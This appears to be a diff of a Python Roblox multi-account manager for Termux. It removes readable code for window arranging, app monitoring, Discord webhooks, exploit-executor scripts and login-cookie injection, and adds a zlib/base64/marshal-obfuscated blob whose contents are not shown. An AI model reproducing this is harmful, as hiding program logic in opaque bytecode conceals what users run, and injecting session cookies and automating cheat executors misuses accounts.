-        # meski dev options freeform dimatikan
-        run_root_cmd(f"am stack movetask {task_id} 5 true")
-        time.sleep(0.2)
-
-        # ── Step 2: am task resize (format standar) ───────────────────
-        run_root_cmd(f"am task resize {task_id} {left} {top} {right} {bottom}")
-        time.sleep(0.15)
-
-        # ── Step 3: am task resize (format koma, Android 10+) ────────
-        run_root_cmd(f"am task resize {task_id} {left},{top},{right},{bottom}")
-        time.sleep(0.1)
-
-        # ── Step 4: am stack resize (resize stack sekalian) ───────────
-        run_root_cmd(f"am stack resize 5 {left} {top} {right} {bottom}")
-        time.sleep(0.1)
-
-        # ── Step 5: move-to-front lalu resize ulang ───────────────────
-        run_root_cmd(f"am task move-to-front {task_id}")
-        time.sleep(0.1)
-        run_root_cmd(f"am task resize {task_id} {left} {top} {right} {bottom}")
-        time.sleep(0.15)
-
-        # ── Step 6: am start --launch-bounds (reposisi tanpa kill) ────
-        if game_id:
-            run_root_cmd(
-                f"am start "
-                f"--launch-bounds {left} {top} {right} {bottom} "
-                f"--activity-single-top "
-                f"-n {pkg}/com.roblox.client.ActivityProtocolLaunch "
-                f"-d roblox://placeID={game_id}"
-            )
-            time.sleep(0.2)
-
-        add_log(f"✅ {username} done")
-
-
-def configure_freeform_window():
-    """Menu 11 - Konfigurasi freeform window arrange"""
-    cfg = load_config()
-    pkgs = load_packages()
-
-    while True:
-        clear_screen()
-        screen_w, screen_h = get_screen_size()
-        per_row        = cfg.get("windows_per_row", 2)
-        freeform_on    = cfg.get("freeform_enabled", False)
-        use_fixed      = cfg.get("use_fixed_size", False)
-        win_w_fixed    = cfg.get("window_width", 540)
-        win_h_fixed    = cfg.get("window_height", 960)
-        arr_interval   = cfg.get("arrange_interval", 30)
-        gap_h          = cfg.get("gap_h", 35)
-        gap_v          = cfg.get("gap_v", 35)
-        total          = len(pkgs)
-
-        # Hitung ukuran preview
-        win_w, win_h, _, _ = get_window_size(cfg, total)
-        rows = (total + per_row - 1) // per_row if total > 0 else 1
-
-        print("=" * 70)
-        print("📐 FREEFORM WINDOW ARRANGER")
-        print("=" * 70)
-        print(f"📱 Screen Size      : {screen_w} x {screen_h}")
-        print(f"📦 Total Packages   : {total}")
-        print(f"🔲 Windows Per Row  : {per_row}")
-        print(f"📏 Size Mode        : {'Fixed (' + str(win_w_fixed) + 'x' + str(win_h_fixed) + ')' if use_fixed else 'Auto (bagi rata)'}")
-        print(f"📐 Window Size      : {win_w} x {win_h} per window")
-        print(f"↔️  Gap Horizontal   : {gap_h}px (antar window kiri/kanan)")
-        print(f"↕️  Gap Vertikal     : {gap_v}px (antar baris atas/bawah)")
-        print(f"⏱️  Arrange Interval : {arr_interval}s")
-        print(f"🔧 Auto Arrange     : {'✅ ON' if freeform_on else '❌ OFF'}")
-        print()
-
-        # Preview grid layout
-        print("🗺️  Layout Preview:")
-        for r in range(rows):
-            row_str = ""
-            for c in range(per_row):
-                idx = r * per_row + c
-                if idx < total:
-                    uname = list(pkgs.values())[idx]["username"][:8]
-                    row_str += f"[{uname:<8}] "
-                else:
-                    row_str += "[  ---   ] "
-            print("   " + row_str)
-
-        print()
-        print("=" * 70)
-        print("1. 🔲 Set Windows Per Row")
-        print("2. 📏 Set Size Mode (Auto / Fixed)")
-        print(f"3. 📐 Set Fixed Size (current: {win_w_fixed}x{win_h_fixed})")
-        print(f"4. ↔️  Set Gap Horizontal (current: {gap_h}px)")
-        print(f"5. ↕️  Set Gap Vertikal (current: {gap_v}px)")
-        print(f"6. ⏱️  Set Arrange Interval (current: {arr_interval}s)")
-        print(f"7. 🔧 Toggle Auto Arrange → {'OFF' if freeform_on else 'ON'}")
-        print("8. 🚀 Arrange NOW (resize window yang sudah jalan)")
-        print("0. ↩️  Back")
-        print("=" * 70)
-
-        c = input("📌 Select: ").strip()
-
-        if c == "1":
-            try:
-                val = int(input(f"Windows per row (current={per_row}, 1-6): ").strip())
-                if 1 <= val <= 6:
-                    cfg["windows_per_row"] = val
-                    save_config(cfg)
-                    add_log(f"✅ Windows per row: {val}")
-                else:
-                    print("❌ Harus antara 1-6")
-            except ValueError:
-                print("❌ Input tidak valid")
-            input("Press ENTER...")
-
-        elif c == "2":
-            print("\n1. Auto (bagi rata screen)")
-            print("2. Fixed (ukuran manual)")
-            mode = input("Pilih (1/2): ").strip()
-            if mode == "1":
-                cfg["use_fixed_size"] = False
-                add_log("✅ Size mode: Auto")
-            elif mode == "2":
-                cfg["use_fixed_size"] = True
-                add_log("✅ Size mode: Fixed")
-            save_config(cfg)
-            input("Press ENTER...")
-
-        elif c == "3":
-            try:
-                print(f"\nCurrent fixed size: {win_w_fixed} x {win_h_fixed}")
-                w = input(f"Width (Enter={win_w_fixed}): ").strip()
-                h = input(f"Height (Enter={win_h_fixed}): ").strip()
-                if w:
-                    cfg["window_width"] = int(w)
-                if h:
-                    cfg["window_height"] = int(h)
-                save_config(cfg)
-                add_log(f"✅ Fixed size: {cfg['window_width']}x{cfg['window_height']}")
-            except ValueError:
-                print("❌ Input tidak valid")
-            input("Press ENTER...")
-
-        elif c == "4":
-            try:
-                val = int(input(f"Gap horizontal px (current={gap_h}, 0=no gap): ").strip())
-                if val >= 0:
-                    cfg["gap_h"] = val
-                    save_config(cfg)
-                    add_log(f"✅ Gap horizontal: {val}px")
-                else:
-                    print("❌ Minimal 0")
-            except ValueError:
-                print("❌ Input tidak valid")
-            input("Press ENTER...")
-
-        elif c == "5":
-            try:
-                val = int(input(f"Gap vertikal px (current={gap_v}, 0=no gap): ").strip())
-                if val >= 0:
-                    cfg["gap_v"] = val
-                    save_config(cfg)
-                    add_log(f"✅ Gap vertikal: {val}px")
-                else:
-                    print("❌ Minimal 0")
-            except ValueError:
-                print("❌ Input tidak valid")
-            input("Press ENTER...")
-
-        elif c == "6":
-            try:
-                val = int(input(f"Arrange interval detik (current={arr_interval}, min=10): ").strip())
-                if val >= 10:
-                    cfg["arrange_interval"] = val
-                    save_config(cfg)
-                    add_log(f"✅ Arrange interval: {val}s")
-                else:
-                    print("❌ Minimal 10 detik")
-            except ValueError:
-                print("❌ Input tidak valid")
-            input("Press ENTER...")
-
-        elif c == "7":
-            cfg["freeform_enabled"] = not freeform_on
-            save_config(cfg)
-            status = "ON" if cfg["freeform_enabled"] else "OFF"
-            add_log(f"✅ Auto Arrange: {status}")
-            input("Press ENTER...")
-
-        elif c == "8":
-            print("\nArranging windows...")
-            arrange_roblox_windows(cfg, pkgs)
-            input("\nPress ENTER...")
-
-        elif c == "0":
-            break
-
-
-# =========================
-# MONITOR LOOP
-# =========================
-def monitor():
-    """Main monitor loop"""
-    global monitor_active
-
-    cfg = load_config()
-    pkgs = load_packages()
-
-    if not cfg["game_id"]:
-        add_log("Game ID not set")
-        input("Enter...")
-        return
-
-    if not pkgs:
-        add_log("No packages found")
-        input("Enter...")
-        return
-
-    monitor_active = True
-
-    # Sequential startup
-    add_log("STARTING SEQUENTIAL STARTUP")
-    time.sleep(2)
-
-    online_count = sequential_startup(pkgs, cfg)
-
-    if online_count == 0:
-        add_log("No accounts went online")
-        input("Enter...")
-        return
-
-    add_log(f"{online_count} accounts online, starting monitor...")
-    time.sleep(3)
-
-    # Webhook startup jika enabled
-    if cfg.get("webhook_enabled") and cfg.get("webhook_url"):
-        message = build_webhook_status_message(pkgs, cfg)
-        send_discord_webhook(
-            cfg["webhook_url"],
-            "🚀 Monitor Started",
-            message,
-            3066993
-        )
-
-    try:
-        cycle_count = 0
-        last_webhook_time = time.time()
-        last_restart_time = time.time()
-        last_arrange_time = time.time()
-
-        while monitor_active:
-            cycle_count += 1
-            display_monitor_screen(pkgs, cfg)
-
-            for pkg, info in pkgs.items():
-                username = info["username"]
-
-                try:
-                    status = determine_account_status(pkg, info, cfg)
-                except Exception as e:
-                    add_log(f"⚠️ Status error {username}: {e}")
-                    continue
-
-                # LANGSUNG KILL saat needs_kill
-                if status == "needs_kill":
-                    add_log(f"🔴 {username}: KILL sekarang!")
-                    stop_app(pkg)
-                    ACCOUNT_STATE.setdefault(pkg, {})
-                    ACCOUNT_STATE[pkg]["launch_time"] = None
-                    ACCOUNT_STATE[pkg]["json_start_time"] = None
-                    ACCOUNT_STATE[pkg]["json_active"] = False
-
-                # Launch saat giliran cek (offline = sudah di-kill atau memang mati)
-                elif status == "offline":
-                    add_log(f"⚫ {username}: LAUNCH → tunggu ingame...")
-                    ACCOUNT_STATE.setdefault(pkg, {})
-                    ACCOUNT_STATE[pkg]["launch_time"] = time.time()
-                    ACCOUNT_STATE[pkg]["json_start_time"] = None
-                    ACCOUNT_STATE[pkg]["json_active"] = False
-
-                    # Auto-inject cookie jika ada mapping
-                    m_cookies = load_cookies()
-                    m_cmap = load_cookie_map()
-                    m_pkg_keys = list(pkgs.keys())
-                    m_idx = m_pkg_keys.index(pkg) if pkg in m_pkg_keys else -1
-                    m_cookie_idx = m_cmap.get(str(m_idx))
-                    if m_cookie_idx is not None and m_cookie_idx < len(m_cookies):
-                        add_log(f"🍪 Re-injecting cookie → {username}")
-                        inject_cookie_to_pkg(pkg, m_cookies[m_cookie_idx])
-
-                    # Hitung bounds - selalu dihitung (freeform aktif di device)
-                    per_row = cfg.get("windows_per_row", 2)
-                    total = len(pkgs)
-                    win_w, win_h, _, _ = get_window_size(cfg, total)
-                    pkg_list = list(pkgs.keys())
-                    idx = pkg_list.index(pkg) if pkg in pkg_list else 0
-                    bounds = calc_bounds(idx, per_row, win_w, win_h)
-
-                    start_app_2step(pkg, *get_pkg_launch_params(pkg, cfg))
-                    time.sleep(cfg["startup_delay"])
-
-                    # Tunggu ingame, max retry 3x
-                    timeout = cfg.get("first_check", 3) * 60
-                    max_retry = 3
-                    retry = 0
-
-                    while retry < max_retry:
-                        deadline = time.time() + timeout
-                        ingame_reached = False
-
-                        while time.time() < deadline:
-                            display_monitor_screen(pkgs, cfg)
-                            try:
-                                cur = determine_account_status(pkg, info, cfg)
-                            except Exception:
-                                cur = "waiting"
-
-                            if cur == "in_game":
-                                add_log(f"✅ {username} ingame! Lanjut akun berikutnya.")
-                                ingame_reached = True
-                                break
-                            elif cur in ("needs_kill", "offline"):
-                                break
-                            time.sleep(cfg["workspace_check_interval"])
-
-                        if ingame_reached:
-                            break
-
-                        retry += 1
-                        if retry < max_retry:
-                            add_log(f"🔁 {username} gagal (retry {retry}/{max_retry})...")
-                            stop_app(pkg)
-                            time.sleep(cfg["restart_delay"])
-                            ACCOUNT_STATE[pkg]["launch_time"] = time.time()
-                            ACCOUNT_STATE[pkg]["json_start_time"] = None
-                            ACCOUNT_STATE[pkg]["json_active"] = False
-                            start_app_2step(pkg, *get_pkg_launch_params(pkg, cfg))
-                            time.sleep(cfg["startup_delay"])
-                        else:
-                            add_log(f"⏱️ {username} max retry habis, skip.")
-
-                display_monitor_screen(pkgs, cfg)
-
-            current_time = time.time()
-
-            # ─── AUTO ARRANGE INTERVAL ───────────────────────────────
-            arrange_interval = cfg.get("arrange_interval", 30)
-            if (current_time - last_arrange_time) >= arrange_interval:
-                add_log("📐 Auto arrange windows...")
-                try:
-                    arrange_roblox_windows(cfg, pkgs)
-                except Exception as e:
-                    add_log(f"⚠️ Arrange error: {e}")
-                last_arrange_time = current_time
-
-            # ─── WEBHOOK INTERVAL ─────────────────────────────────────
-            webhook_interval_seconds = cfg.get("webhook_interval", 10) * 60
-            if cfg.get("webhook_enabled", False) and cfg.get("webhook_url", ""):
-                if (current_time - last_webhook_time) >= webhook_interval_seconds:
-                    try:
-                        message = build_webhook_status_message(pkgs, cfg)
-                        send_discord_webhook(
-                            cfg["webhook_url"],
-                            "📊 Status Update",
-                            message,
-                            3447003
-                        )
-                        add_log("📡 Webhook sent")
-                    except Exception as e:
-                        add_log(f"⚠️ Webhook error: {e}")
-                    last_webhook_time = current_time
-
-            # ─── RESTART INTERVAL ─────────────────────────────────────
-            restart_interval_seconds = cfg.get("restart_interval", 0) * 60
-            if restart_interval_seconds > 0:
-                if (current_time - last_restart_time) >= restart_interval_seconds:
-                    add_log("⏰ Auto restart time reached")
-                    if cfg.get("webhook_enabled", False) and cfg.get("webhook_url", ""):
-                        try:
-                            send_discord_webhook(
-                                cfg["webhook_url"],
-                                "🔄 Auto Restart",
-                                "Restarting all Roblox packages...",
-                                16776960
-                            )
-                        except Exception:
-                            pass
-                    restart_all_roblox(pkgs, cfg)
-                    last_restart_time = current_time
-
-            time.sleep(cfg["check_interval"])
-    
-    except Exception as e:
-        add_log(f"Monitor error: {e}")
-        
-        if cfg.get("webhook_enabled", False) and cfg.get("webhook_url", ""):
-            send_discord_webhook(
-                cfg["webhook_url"],
-                "❌ Monitor Error",
-                f"Error occurred: {str(e)}",
-                16711680
-            )
-        
-        input("Press ENTER...")
-    finally:
-        monitor_active = False
-
-def restart_all_roblox(pkgs, cfg):
-    """Restart semua Roblox package"""
-    add_log("=" * 40)
-    add_log("RESTARTING ALL ROBLOX PACKAGES")
-    add_log("=" * 40)
-    
-    # Stop semua
-    for pkg, info in pkgs.items():
-        if is_app_running(pkg):
-            add_log(f"Stopping {info['username']}")
-            stop_app(pkg)
-    
-    add_log("Waiting before restart...")
-    time.sleep(cfg["restart_delay"] * 2)
-    
-    # Start semua sequential
-    return sequential_startup(pkgs, cfg)
-
-# =========================
-# MENU
-# =========================
-def menu():
-    """Main menu"""
-    while True:
-        clear_screen()
-        cfg = load_config()
-        pkgs = load_packages()
-        
-        print("=" * 70)
-        print("🤖 ROBLOX MULTI-PACKAGE MANAGER (Termux/Cloudphone) v2")
-        print("=" * 70)
-        print(f"🎮 Game ID      : {cfg.get('game_id', 'Not set')}")
-        executor_display = {
-            "delta": "DELTA (Per Package)",
-            "delta_global": "DELTA (Global Folder)",
-            "arceusx": "ARCEUS X",
-            "ronix": "RONIX"
-        }.get(cfg.get('executor', 'delta'), cfg.get('executor', 'delta').upper())
-        print(f"⚡ Executor     : {executor_display}")
-        print(f"📦 Packages     : {len(pkgs)}")
-        print(f"⏱️ First Check  : {cfg.get('first_check', 3)} minutes")
-        
-        # Webhook info
-        webhook_status = "✅" if cfg.get("webhook_enabled", False) else "❌"
-        print(f"📡 Webhook      : {webhook_status}")
-        if cfg.get("webhook_url", ""):
-            webhook_display = cfg["webhook_url"][:40] + "..." if len(cfg["webhook_url"]) > 40 else cfg["webhook_url"]
-            print(f"   URL          : {webhook_display}")
-            print(f"   Interval     : {cfg.get('webhook_interval', 10)} minutes")
-            restart_text = f"{cfg.get('restart_interval', 0)} minutes" if cfg.get('restart_interval', 0) > 0 else "Disabled"
-            print(f"   Auto Restart : {restart_text}")
-        
-        if pkgs:
-            print("\n📋 Registered Packages:")
-            for i, (pkg, info) in enumerate(pkgs.items(), 1):
-                if EXECUTOR_TYPE in ["arceusx", "ronix", "delta_global"]:
-                    scripts_count = len(list_executor_scripts(info))
-                    print(f"  {i}. {info['username']} (📜:{scripts_count})")
-                else:
-                    cache_dir = find_cache_dir(pkg)
-                    cache_status = "✅" if cache_dir else "❌"
-                    scripts_count = len(list_executor_scripts(info))
-                    print(f"  {i}. {info['username']} (🗂️:{cache_status} 📜:{scripts_count})")
-        
-        print("=" * 70)
-        print("1. 🚀 Start Monitor (All Packages)")
-        print("2. 🚀 Auto Setup (Detect + Game ID + Executor)")
-        print("3. 🔍 Auto Detect Packages")
-        print("4. 📡 Configure Webhook")
-        print("5. ⏱️ Set First Check Time")
-        print("-" * 40)
-        print("6. 📝 Add Script to ALL Packages")
-        print("7. 🗑️ Delete Script from ALL Packages")
-        print("8. 👁️ View Scripts in ALL Packages")
-        print("8a. 📂 View/Manage Workspace Files")
-        print("-" * 40)
-        print("9. 🗂️ Copy ALL Cache Files to ALL Packages")
-        print("10. 📊 View Cache Folder Status")
-        print("-" * 40)
-        freeform_status = "✅ ON" if cfg.get("freeform_enabled", False) else "❌ OFF"
-        per_row = cfg.get("windows_per_row", 2)
-        size_mode = "Fixed" if cfg.get("use_fixed_size", False) else "Auto"
-        win_w_cfg = cfg.get("window_width", 540)
-        win_h_cfg = cfg.get("window_height", 960)
-        size_info = f"{win_w_cfg}x{win_h_cfg}" if cfg.get("use_fixed_size", False) else "Auto"
-        print(f"11. 📐 Freeform Arranger [{freeform_status} | {per_row}/row | {size_info}]")
-        print("12. 🌐 Add Server (per-package game_id / private link)")
-        print("-" * 40)
-        cookie_count = len(load_cookies())
-        print(f"13. 🍪 Manage Cookies [{cookie_count} cookie(s)]")
-        print("14. 🔑 Login Cookie")
-        print("-" * 40)
-        print("0. ❌ Exit\n")
-        
-        c = input("📌 Select: ").strip()
-        
-        if c == "1": 
-            monitor()
-        elif c == "2":
-            auto_setup_wizard()
-        elif c == "3": 
-            auto_detect_and_save_packages()
-        elif c == "4":
-            clear_screen()
-            print("=" * 70)
-            print("📡 WEBHOOK CONFIGURATION")
-            print("=" * 70)
-            
-            current_url = cfg.get("webhook_url", "")
-            if current_url:
-                print(f"Current URL: {current_url}")
-                webhook_url = input("🔗 Discord webhook URL (Enter to keep current): ").strip()
-                if not webhook_url:
-                    webhook_url = current_url  # ← pakai URL lama jika kosong
-            else:
-                webhook_url = input("🔗 Discord webhook URL (Enter to skip): ").strip()
-            
-            if webhook_url:
-                cfg["webhook_url"] = webhook_url
-            
-            enable = input("📡 Enable webhook? (y/n, default=y): ").strip().lower()
-            cfg["webhook_enabled"] = (enable == "" or enable == "y")
-            
-            interval = input("⏱️ Webhook interval in minutes (default=10): ").strip()
-            if interval:
-                try:
-                    cfg["webhook_interval"] = int(interval)
-                except:
-                    cfg["webhook_interval"] = 10
-            
-            save_config(cfg)
-            add_log("✅ Webhook configuration saved")
-            input("\nPress ENTER...")
-        elif c == "5":
-            clear_screen()
-            print("=" * 70)
-            print("⏱️ CHECK TIME & RESTART CONFIGURATION")
-            print("=" * 70)
-
-            current_first = cfg.get("first_check", 3)
-            current_ingame = cfg.get("ingame_check", 2)
-            current_restart = cfg.get("restart_interval", 0)
-            print(f"First Check (saat launch)   : {current_first} menit")
-            print(f"Ingame Check (saat hop/mati): {current_ingame} menit")
-            restart_text = f"{current_restart} menit" if current_restart > 0 else "Disabled"
-            print(f"Auto Restart Interval       : {restart_text}\n")
-
-            new_first = input(f"⏱️ First check time in minutes (Enter={current_first}): ").strip()
-            if new_first:
-                try:
-                    cfg["first_check"] = int(new_first)
-                except:
-                    add_log("❌ Invalid input")
-
-            new_ingame = input(f"🎮 Ingame check time in minutes (Enter={current_ingame}): ").strip()
-            if new_ingame:
-                try:
-                    cfg["ingame_check"] = int(new_ingame)
-                except:
-                    add_log("❌ Invalid input")
-
-            new_restart = input(f"🔄 Auto restart interval in minutes (0=disabled, Enter={current_restart}): ").strip()
-            if new_restart:
-                try:
-                    cfg["restart_interval"] = int(new_restart)
-                except:
-                    add_log("❌ Invalid input")
-
-            save_config(cfg)
-            add_log(f"✅ First={cfg['first_check']}m | Ingame={cfg['ingame_check']}m | Restart={cfg['restart_interval']}m")
-            input("\nPress ENTER...")
-        elif c == "6":
-            add_script_to_all_packages()
-        elif c == "7":
-            delete_script_from_all_packages()
-        elif c == "8":
-            view_scripts_all_packages()
-        elif c == "8a":
-            view_workspace_files()
-        elif c == "9":
-            copy_license_to_all_packages()
-        elif c == "10":
-            view_license_status()
-        elif c == "11":
-            configure_freeform_window()
-        elif c == "12":
-            configure_server_per_pkg()
-        elif c == "13":
-            manage_cookies_menu()
-        elif c == "14":
-            login_cookies_menu()
-        elif c == "0": 
-            break
-
-# =========================
-# MAIN
-# =========================
-if __name__ == "__main__":
-    import traceback
-
-    # Setup logging ke log.txt
-    LOG_TO_FILE = True
-    if LOG_TO_FILE:
-        _log_f = open("log.txt", "w")
-
-        class _Logger:
-            def __init__(self, f, s):
-                self.f = f
-                self.s = s
-            def write(self, msg):
-                self.f.write(msg)
-                self.f.flush()
-                self.s.write(msg)
-                self.s.flush()
-            def flush(self):
-                self.f.flush()
-                self.s.flush()
-
-        sys.stdout = _Logger(_log_f, sys.__stdout__)
-        sys.stderr = _Logger(_log_f, sys.__stderr__)
-
-    try:
-        print(f"=== OVA.PY START === Python {sys.version}")
-        menu()
-    except Exception as e:
-        print(f"\n=== ERROR ===")
-        print(f"Type: {type(e).__name__}")
-        print(f"Message: {e}")
-        traceback.print_exc()
-    finally:
-        if LOG_TO_FILE:
-            _log_f.close()
+# -*- coding: utf-8 -*-
+import zlib as _QFiQDlig
+import base64 as _WNbLnsIW
+import marshal as _RJACzalU
+_NfiIRlGXQgUD=(
+"c-qvxd3YN~ekj<u8}|(YAV@ZEg7+m+qApXsMDdc?f-RepIS>g^ut<PvkUB6Pn=_et1KIOpO7ceVkqFLY"
+"V>*+~F#EDE%D(KbY|r7$B=Z^uB*GYuqD-{j_50&JD%Kl2biU12RW}+9vPnvg^S&=S3f0wB)ph>v`qkfK"
+"ygv%|_tQU-Vc7qKkr*lJ$0+7kM2XO^m=dF32_-?l(!;Wln7|IpDFwmg#3>y8Dk&xURZ%MNEACexR#R$}"
+"N7Ao3tfjOBb^;r5VH^I86m3k~BxkWePU8*{6U+QkrcFv$3Y0dH(j8*9oaM2~$+&XX$0{f1%Gn;PoPsNt"
+"_gLj{uAH4zo^z0@b52rC<&zr9)re6AC$uFPsU>y0MN}bpE+X|#j3P(_2#ZN02uny42un#b2+K$d2+PTn"
+"q}7Q%C!#7y8+fiH^FUZd+Ck_h9U!bGogl0s^Fdfkx<FV*7J#sxECgW#Sp>pHk^o^7`7BwC>S`uSz;g>("
+"3c^;h41_z#auDt$D?r#rR)TOBSp~w~q#K0oWHku)kToFOOV)yLA6W;&{bW4|50DKYe1dGGI>;svJ4iNz"
+"u#;>7VHep7!ftX02z$t#AnYaEKzNAU1;RdZjNFY{beL=h&;8^c5Dt)gK{!b61K|+4AB4l?0T3P`p8(-e"
+"vIB%8<k!f9s3b{tg6Cso7YIFMHwd33dqDUU*$cws<RK6~P4<EC8S*d)N6CH=o*=#C04jfy90bqLf^i-~"
+"&tv2;c>WrB1cYAlC<srHBOn|<F+q~;$1%+N?=WUJ`Y0cHj5>YdbQQY-yq#bbOoBP~kWX?e;fx&vDNi{u"
+"@;H~~KjAOIPMkS`k0dv)qfD+7_|#c$ZDsPOw#+}BNh`!o1i)9H1|{xpETO|%#F-roAjNnIwgcmyvb`~a"
+"I?s%JBJf2n_oN8^EyhmFC@^my=-D~+-Dh~U!{^Zx6lnjsOzOx7+qMaoI&tFMx>VoD#~VxXTVDj`g*w-H"
+"ZfJt}JuNzo?UNK?r(qi(t7oUNOiA}ClyS%{O5+pWS>LRG+6UsY3E#OnUsydJ44n2));|{t2Ey7I@Az5o"
+"q%Xug8fMN;j)i>Gc^}25sK$fAvwmOw?8Vuzo{5i5duPzg9$4kntT$ZV5Sk5Apqd8X^xPEq;zUDZLl=D2"
+"&@nd~^j-9g&&~S6rJHAaDoC9TfwuTQ0oVoujg?P(FHZRa<DzvaNdi$)j|ifqLToe(-o!$~Oo~Xc2Wya!"
+"@UN7V?Un{a9?^(&V_s5@Hi{F&z<ap>_*8B_^ko>SD8q{Rtx;{v4VIe@PSdEC`zD@UC`H($VpO+9Ugf&H"
+"23}q}h6TjDyef}4cNv0326A+WCl$<Zc9FT&LuqknE-bDaKlTZ1wOf+bjeBQi=P2J;aBg;HZZ<8Q^<A7z"
+"E8r>uDHI&(G#1u(2B)XJfeC_551YG3Mutb)iO?Jo2+k6xgL8q2Y%U)~1*vwztxT&zbEjsg;J7aoN=vA@"
+"Kw3rlz~=(v!3kel9-5s1m8E5&S;{|?)*WLi@4h(Wr+gD>g?D0NY$`aJHum_Zd_%$69{81RSa(|4eR143"
+"GwTlqKp!OI(-UbCl@|FzaK#V=k(LL~d+TQ|r8VH2V^lCWI|lMl5LH6d7<vN)^Vq7`ATzCKY_ANxG?daB"
+"7h0ocT2qk9FG?A$DU0oaQl?c!M5`LCto-f0Z|z-bN|d%n&b@N+^2JwPxcovwUqs`3Z<c`I^A)vqSzQ)a"
+"mwk$fL6x|kHWVlEl8^Mp6}2myR-VKwP?{x^w$KnOj+vP^D|+J>t1^(j7ODpA`&Ngf1ION#i(rTs9V8_0"
+"x-Bp~pakK2xb9%S<h^_uh>!D^o-(s<8Xs}rWL9<n^I#kZ0y#Zkt&hsMbq01<29%4jfM_&BGJ-v1#-0?1"
+"#0^+TY{m|OF%Fgp?I2Q;S)-Y+On~|Z;Vu*(5f2t(m>R6!kT}4tW!NH8+WsnNj~cco1PM^^H`5LRw6G9c"
+"pEileQdrMvuup5VUjwzC7Q_8Ppj;Wii}o1%<dzSGwGD8=HjK~A`2(kelmqSnCA)@$6xtD=K%nB5rNzNe"
+"S_v|ajf0g5_D*od7f4G0Bm?Vy)=SNXF8F89xFr-MR@0)>Y3Y<dz^zd#AEs(2ePC^7s-WQN+y__aci0uG"
+"kr`Jkw(A2|2d)i8ly}vZl-WgVT=&6pZHTobwUvuaEB5?%yb0HlKk~*V{`|n79=Nq<xn=mqv3I<2*O7$%"
+"XrwQtw?~^^{zfW~_)LN6s^Z$pdwSPrG7w!=VFu$r{(}-LI4b%~0un%lDD8_?u}Eh8NN-pR9foVM;GhwU"
+"X+ZGDs)Ly1KRP=0sNOZpVd&6-gm){I;N82;I1Km5K+1cV>Yz^Xo=O5z-qWGbC_ZS-U90lUTBXJ8S`}@w"
+"-oWgSNH&Mc0nz$ZKuQ8)@E_oUfE4_fJq1?jp#;b&_sB<N0;^NHesy}misY?w`Bqqgl*xE(M?gH-hDr#1"
+"NB$LlM>2SJ)9)z0!tY22Z*2M<TyR(a`Ir8dZ16S%367W60UYI#qEH6IfWjjtm306X1aOanjVV1iDM2s-"
+"eD8P^rje>TQ01@)%)4q-&9wq2)tU9dOH~S{s<KQSsi~KgZ2?JoMMG^luq1<RwHz#&_DyrJ1Obq+a?m$@"
+"EI8|(YX1awJdA_q9?Iuy590^tPM-!8S$kN~=^a1gn`rlA0Ni{s0pX6ALE88%EIKxQDy^6c`6f_g#z&3&"
+"0<&&8pk*P%qI}*71a7D@_$=`UAfla_@`E1=B2u@SDu-`mC|6no8ac+)d-haX4WCYf2Ehl_DW*v<t{g{="
+"0#T|0mPQ#-BS1<m>|Y%W>LCnMGk`AhhXHsR2=FNH^cWhE-5_ZY<~<~0;2j~etngr4%3{6Vf2IH0V5A$t"
+"r&T#-cSJNPTV6z+vf3glkRhV{dy6B|mC~DEdGYd#(XTJ-YvTHvm7<bZ>)Y*bwSRx_lIX1iiK3RP8i3cY"
+"7hNfeIhT#KabxXDVR5YN?drFxzhAp}?yZJIVe?h>`YZ)R%<{JLE$8=Li{7`25(Q0HRhcY~Wn)dkShM0P"
+"ib>yAy`}oTX7T7-`h=_Ts`7ymvpQETSYBz|*0|Ijx9z*7jNAGm>U-v*SXta$5y4ZYf|xXJDvK!YHSW6E"
+"^dB?}ZE<t?qWMEp?XBX7;-MUK6h_a)&L!;bl{{DUso2p(US&4+Kp{1#Rxznk^;ruTmpj_ZFIM-8WR{Qg"
+"=CzO;f^1E9G4|WWZoTA2rwl~juj;4(KR?#1x(gLQcHl5xEbcCs<WSulM7BsaLS#=48w9Cq{*IUw18RCJ"
+"7%e8n0f`6D2)&|1dm&We)h+QzbpQspNV0H%_g2QG$~`g;o+%(?$$>ic5K?T}21S;l0T4u<19|YAcZ!^M"
+"${c96#TQ6Cr<`gO--=Ht$)WYP91peNcxXK8obk})jK_ZjDe5i9L(A*4cHMaBa^B^Rhn_bcn#ULq!}0$H"
+";luIEFoZB2z-kD^jUIzXg<!nNV<K?~&nG~wy`n+D?|6(JQx>iV%pP-=|H*u(&W_$lM)h2~%vs1@r-j%O"
+")OLWuEu+RvE?#~~Hb1G!#31BHP+iPH^)>m7e<FCAn9P)1Q;mCP2?o@Mjeze3PtE%qCVb}`0&`PSVORF`"
+"+zjNP_-{XfUHL?p!3_V;>#xB-e|3PZ{plwt$P7?$OS_ebgQ1#W(1>97>8YR>GHswz0Ntm2z8OS9rX>L3"
+"P|dK6C9PrE{;_};<Whjfj{$}&Ed>!kzA_*mP@riENPxVUceV-O71YqCw0s8AvEX-(eGW0dY9_;2$T!}^"
+"6l%^CYGw;HvxS=3Le2a_%?wRFhFY%hO?hVk4gs9p%v{Kli#FEb4=cnUnI1vHc`gKE6kzDFa}bftvWUbj"
+"Gq0EmW41+2>;<}LXTsDLQQXzrQfAvdz3r86T>i$(FGi#(OI}2I-<%ieT(J<b_Qml<58d2J7k4Er-I4AU"
+"TM1p-k+2<%^xiew|4{Lf!G6!`ygqtm^xDZt&x+L^wZ+7*Ij@bae{dGX6mM(a(tcmRB#INw31>^B|GviX"
+"%Hfv|FND4~eE(njTlbvAYjuki@6^Q|yKZ*J?HzyzuocJp<F<xKFX(>M_}gCx+(4`?o>#r-i`!ZjBq@XW"
+")o)yTF>a`UamSlv%p4=%I1x9vuPGnw!7TQN`!R#{RWj;`wIr;Si=u?Sn#QX?hkSzhBR$|*^B~f(_DHa3"
+"S0xC4EZq;npGd?#3W=~_=RMJ5qZkaJkZsTmAoHJtn>`1ZO4b2WsYjXvDDxqqDMa4#YTW~o5<o8s0U}r?"
+"NCd-L#iJbQyESUc1-=Mi0TOfY3<IzRr<h+r0E?0E3XKMMQXudt&yucLROeA}r~v@h<C6?1Mu1ew63AkJ"
+"^t4&TMyfbcSj!`uxl~eJFXjMZhRoFrQF}7bi`ol`Su+BGbD<m{D1UN#ge2P$AY)<M!V?U|hyYv-1XkiK"
+"_2^b)fgNC{A>o=OXA$&6#3KXblvEdtcOwFmfoN0+(yP=Vn51Lc19<GfETEAY%2f_?0LmHXh*3neD*4by"
+"0OY{j49FP+?|u&!`F~kny#Uazf*>dFUY;Egt!C%-eOLDV&H(^z3fzl_mqJTEde0DDJ)9^w5*fN{E{2=l"
